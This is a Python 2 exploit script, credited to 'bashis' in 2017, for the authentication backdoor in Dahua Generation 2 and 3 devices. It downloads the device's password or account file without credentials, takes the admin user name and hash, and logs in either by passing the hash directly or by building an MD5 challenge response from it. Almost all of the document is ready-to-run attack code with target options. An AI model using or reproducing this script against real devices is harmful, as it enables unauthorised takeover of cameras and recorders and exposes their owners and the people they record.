#!/usr/bin/python2.7
#
# Dahua backdoor Generation 2 and 3
# Author: bashis <mcw noemail eu> March 2017
#
# Credentials: No credentials needed (Anonymous)
#Jacked from git history
#
  
import string
import sys
import socket
import argparse
import urllib, urllib2, httplib
import base64
import ssl
import json
import commentjson # pip install commentjson
import hashlib
  
class HTTPconnect:
  
    def __init__(self, host, proto, verbose, creds, Raw, noexploit):
        self.host = host
        self.proto = proto
        self.verbose = verbose
        self.credentials = creds
        self.Raw = Raw
        self.noexploit = False
        self.noexploit = noexploit
      
    def Send(self, uri, query_headers, query_data,ID):
        self.uri = uri
        self.query_headers = query_headers
        self.query_data = query_data
        self.ID = ID
  
        # Connect-timeout in seconds
        timeout = 5
        socket.setdefaulttimeout(timeout)
  
        url = '%s://%s%s' % (self.proto, self.host, self.uri)
  
        if self.verbose:
            print "[Verbose] Sending:", url
  
        if self.proto == 'https':
            if hasattr(ssl, '_create_unverified_context'):
                print "[i] Creating SSL Unverified Context"
                ssl._create_default_https_context = ssl._create_unverified_context
  
        if self.credentials:
            Basic_Auth = self.credentials.split(':')
            if self.verbose:
                print "[Verbose] User:",Basic_Auth[0],"Password:",Basic_Auth[1]
            try:
                pwd_mgr = urllib2.HTTPPasswordMgrWithDefaultRealm()
                pwd_mgr.add_password(None, url, Basic_Auth[0], Basic_Auth[1])
                auth_handler = urllib2.HTTPBasicAuthHandler(pwd_mgr)
                opener = urllib2.build_opener(auth_handler)
                urllib2.install_opener(opener)
            except Exception as e:
                print "[!] Basic Auth Error:",e
                sys.exit(1)
  
        if self.noexploit and not self.verbose:
            print "[<] 204 Not Sending!"
            html =  "Not sending any data"
        else:
            if self.query_data:
                req = urllib2.Request(url, data=json.dumps(self.query_data), headers=self.query_headers)
                if self.ID:
                    req.add_header('DhWebClientSessionID',self.ID)
            else:
                req = urllib2.Request(url, None, headers=self.query_headers)
                if self.ID:
                    req.add_header('DhWebClientSessionID',self.ID)
            rsp = urllib2.urlopen(req)
#           print rsp
            if rsp:
                print "[<] %s OK" % rsp.code
  
        if self.Raw:
            return rsp
        else:
            html = rsp.read()
            return html
  
  
class Dahua_Backdoor:
  
    def __init__(self, rhost, proto, verbose, creds, Raw, noexploit):
        self.rhost = rhost
        self.proto = proto
        self.verbose = verbose
        self.credentials = creds
        self.Raw = Raw
        self.noexploit = False
        self.noexploit = noexploit
  
    # Generation 2
    def Gen2(self,response,headers):
        self.response = response
        self.headers = headers
  
        html = self.response.readlines()
  
        for line in html:
            if line[0] == "#" or line[0] == "\n":
                continue
            line = line.split(':')[0:25]
            if line[1] == 'admin':
                print "[i] Chosing Admin Login: {}, PWD hash: {}".format(line[1],line[2])
                ADMIN = line[1]
                PWD = line[2]
                break
            elif line[1] == '888888':
                print "[i] Choosing Admin Login: {}, PWD hash: {}".format(line[1],line[2])
                ADMIN = line[1]
                PWD = line[2]
                break
            else:
                if line[3] == '1':
                    print "Choosing Admin Login [{}]: {}, PWD hash: {}".format(line[0],line[1],line[2])
                    ADMIN = line[1]
                    PWD = line[2]
                break
  
        #
        # Login 1
        #
        print "[>] Requesting our session ID"
        query_args = {"method":"global.login",
            "params":{
                "userName":ADMIN,
                "password":"",
                "clientType":"Web3.0"},
            "id":10000}
  
        URI = '/RPC2_Login'
        response = HTTPconnect(self.rhost,self.proto,self.verbose,self.credentials,self.Raw,self.noexploit).Send(URI,headers,query_args,None)
  
        json_obj = json.load(response)
        if self.verbose:
            print json.dumps(json_obj,sort_keys=True,indent=4, separators=(',', ': '))
  
        #
        # Login 2
        #
        print "[>] Logging in"
  
        query_args = {"method":"global.login",
            "session":json_obj['session'],
            "params":{
                "userName":ADMIN,
                "password":PWD,
                "clientType":"Web3.0",
                "authorityType":"OldDigest"},
            "id":10000}
  
        URI = '/RPC2_Login'
        response = HTTPconnect(self.rhost,self.proto,self.verbose,self.credentials,self.Raw,self.noexploit).Send(URI,headers,query_args,json_obj['session'])
        print response.read()
  
        #
        # Wrong username/password
        # { "error" : { "code" : 268632071, "message" : "Component error: password not valid!" }, "id" : 10000, "result" : false, "session" : 1997483520 }
        # { "error" : { "code" : 268632070, "message" : "Component error: user's name not valid!" }, "id" : 10000, "result" : false, "session" : 1997734656 }
        #
        # Successfull login
        # { "id" : 10000, "params" : null, "result" : true, "session" : 1626533888 }
        # 
  
        #
        # Logout
        #
        print "[>] Logging out"
        query_args = {"method":"global.logout",
            "params":"null",
            "session":json_obj['session'],
            "id":10001}
  
        URI = '/RPC2'
        response = HTTPconnect(self.rhost,self.proto,self.verbose,self.credentials,self.Raw,self.noexploit).Send(URI,headers,query_args,None)
        return response
  
    # Generation 3
    def Gen3(self,response,headers):
        self.response = response
        self.headers = headers
  
        json_obj = commentjson.load(self.response)
        if self.verbose:
            print json.dumps(json_obj,sort_keys=True,indent=4, separators=(',', ': '))
  
        for who in json_obj[json_obj.keys()[0]]:
            if who['Group'] == 'admin':
                USER_NAME = who['Name']
                PWDDB_HASH = who['Password']
                AUTH_NO = len(who['AuthorityList'])
                if AUTH_NO >= 20:
                    print "[i] Choosing Admin Login: {}, Auth: {}".format(who['Name'],len(who['AuthorityList']))
                    break
        #
        # Request login
        #
        print "[>] Requesting our session ID"
        query_args = {"method":"global.login",
            "params":{
                "userName":USER_NAME,
                "password":"",
                "clientType":"Web3.0"},
            "id":10000}
  
        URI = '/RPC2_Login'
        response = HTTPconnect(self.rhost,self.proto,self.verbose,self.credentials,self.Raw,self.noexploit).Send(URI,headers,query_args,None)
  
        json_obj = json.load(response)
        if self.verbose:
            print json.dumps(json_obj,sort_keys=True,indent=4, separators=(',', ': '))
  
        RANDOM = json_obj['params']['random']
        PASS = ''+ USER_NAME +':' + RANDOM + ':' + PWDDB_HASH + ''
        RANDOM_HASH = hashlib.md5(PASS).hexdigest().upper()
  
        print "[i] Downloaded MD5 hash:",PWDDB_HASH
        print "[i] Random value to encrypt with:",RANDOM
        print "[i] Built password:",PASS
        print "[i] MD5 generated password:",RANDOM_HASH
  
        #
        # Login
        #
        print "[>] Logging in"
  
        query_args = {"method":"global.login",
            "session":json_obj['session'],
            "params":{
                "userName":USER_NAME,
                "password":RANDOM_HASH,
                "clientType":"Web3.0",
                "authorityType":"Default"},
            "id":10000}
  
        URI = '/RPC2_Login'
        response = HTTPconnect(self.rhost,self.proto,self.verbose,self.credentials,self.Raw,self.noexploit).Send(URI,headers,query_args,json_obj['session'])
        print response.read()
  
        # Wrong username/password
        # { "error" : { "code" : 268632071, "message" : "Component error: password not valid!" }, "id" : 10000, "result" : false, "session" : 1156538295 }
        # { "error" : { "code" : 268632070, "message" : "Component error: user's name not valid!" }, "id" : 10000, "result" : false, "session" : 1175812023 }
        #
        # Successfull login
        # { "id" : 10000, "params" : null, "result" : true, "session" : 1175746743 }
        #
  
        #
        # Logout
        #
        print "[>] Logging out"
        query_args = {"method":"global.logout",
            "params":"null",
            "session":json_obj['session'],
            "id":10001}
  
        URI = '/RPC2'
        response = HTTPconnect(self.rhost,self.proto,self.verbose,self.credentials,self.Raw,self.noexploit).Send(URI,headers,query_args,None)
        return response
  
#
# Validate correctness of HOST, IP and PORT
#
class Validate:
  
    def __init__(self,verbose):
        self.verbose = verbose
  
    # Check if IP is valid
    def CheckIP(self,IP):
        self.IP = IP
  
        ip = self.IP.split('.')
        if len(ip) != 4:
            return False
        for tmp in ip:
            if not tmp.isdigit():
                return False
        i = int(tmp)
        if i < 0 or i > 255:
            return False
        return True
  
    # Check if PORT is valid
    def Port(self,PORT):
        self.PORT = PORT
  
        if int(self.PORT) < 1 or int(self.PORT) > 65535:
            return False
        else:
            return True
  
    # Check if HOST is valid
    def Host(self,HOST):
        self.HOST = HOST
  
        try:
            # Check valid IP
            socket.inet_aton(self.HOST) # Will generate exeption if we try with DNS or invalid IP
            # Now we check if it is correct typed IP
            if self.CheckIP(self.HOST):
                return self.HOST
            else:
                return False
        except socket.error as e:
            # Else check valid DNS name, and use the IP address
            try:
                self.HOST = socket.gethostbyname(self.HOST)
                return self.HOST
            except socket.error as e:
                return False
  
  
  
if __name__ == '__main__':
  
#
# Help, info and pre-defined values
#   
    INFO =  '[Dahua backdoor Generation 2 & 3 (2017 bashis <mcw noemail eu>)]\n'
    HTTP = "http"
    HTTPS = "https"
    proto = HTTP
    verbose = False
    noexploit = False
    raw_request = True
    rhost = '192.168.5.2'   # Default Remote HOST
    rport = '80'            # Default Remote PORT
#   creds = 'root:pass'
    creds = False
  
  
#
# Try to parse all arguments
#
    try:
        arg_parser = argparse.ArgumentParser(
        prog=sys.argv[0],
                description=('[*] '+ INFO +' [*]'))
        arg_parser.add_argument('--rhost', required=False, help='Remote Target Address (IP/FQDN) [Default: '+ rhost +']')
        arg_parser.add_argument('--rport', required=False, help='Remote Target HTTP/HTTPS Port [Default: '+ rport +']')
        if creds:
            arg_parser.add_argument('--auth', required=False, help='Basic Authentication [Default: '+ creds + ']')
        arg_parser.add_argument('--https', required=False, default=False, action='store_true', help='Use HTTPS for remote connection [Default: HTTP]')
        arg_parser.add_argument('-v','--verbose', required=False, default=False, action='store_true', help='Verbose mode [Default: False]')
        arg_parser.add_argument('--noexploit', required=False, default=False, action='store_true', help='Simple testmode; With --verbose testing all code without exploiting [Default: False]')
        args = arg_parser.parse_args()
    except Exception as e:
        print INFO,"\nError: %s\n" % str(e)
        sys.exit(1)
  
    # We want at least one argument, so print out help
    if len(sys.argv) == 1:
        arg_parser.parse_args(['-h'])
  
    print "\n[*]",INFO
  
    if args.verbose:
        verbose = args.verbose
#
# Check validity, update if needed, of provided options
#
    if args.https:
        proto = HTTPS
        if not args.rport:
            rport = '443'
  
    if creds and args.auth:
        creds = args.auth
  
    if args.noexploit:
        noexploit = args.noexploit
  
    if args.rport:
        rport = args.rport
  
    if args.rhost:
        rhost = args.rhost
  
    # Check if RPORT is valid
    if not Validate(verbose).Port(rport):
        print "[!] Invalid RPORT - Choose between 1 and 65535"
        sys.exit(1)
  
    # Check if RHOST is valid IP or FQDN, get IP back
    rhost = Validate(verbose).Host(rhost)
    if not rhost:
        print "[!] Invalid RHOST"
        sys.exit(1)
  
  
#
# Validation done, start print out stuff to the user
#
    if noexploit:
        print "[i] Test mode selected, no exploiting..."
    if args.https:
        print "[i] HTTPS / SSL Mode Selected"
    print "[i] Remote target IP:",rhost
    print "[i] Remote target PORT:",rport
#   print "[i] Connect back IP:",lhost
#   print "[i] Connect back PORT:",lport
  
    rhost = rhost + ':' + rport
  
    headers = {
        'Connection': 'close',
        'Content-Type'  :   'application/x-www-form-urlencoded; charset=UTF-8',
        'Accept'    :   '*/*',
        'X-Requested-With'  :   'XMLHttpRequest',
        'X-Request' :   'JSON',
        'User-Agent':'Mozilla/5.0',
        }
  
    try:
        print "[>] Checking for backdoor version"
        URI = "/current_config/passwd"
        response = HTTPconnect(rhost,proto,verbose,creds,raw_request,noexploit).Send(URI,headers,None,None)
        print "[!] Generation 2 found"
        reponse = Dahua_Backdoor(rhost,proto,verbose,creds,raw_request,noexploit).Gen2(response,headers)
    except urllib2.HTTPError as e:
        if e.code == 404:
            try:
                URI = '/current_config/Account1'
                response = HTTPconnect(rhost,proto,verbose,creds,raw_request,noexploit).Send(URI,headers,None,None)
                print "[!] Generation 3 Found"
                response = Dahua_Backdoor(rhost,proto,verbose,creds,raw_request,noexploit).Gen3(response,headers)
            except urllib2.HTTPError as e:
                if e.code == 404:
                    print "[!] Seems not to be Dahua device! ({})".format(e.code)
                    sys.exit(1)
                else:
                    print "Error Code: {}".format(e.code)
    except Exception as e:
        print "[!] Detect of target failed (%s)" % e
        sys.exit(1)
  
    print "\n[*] All done...\n"
    sys.exit(0)
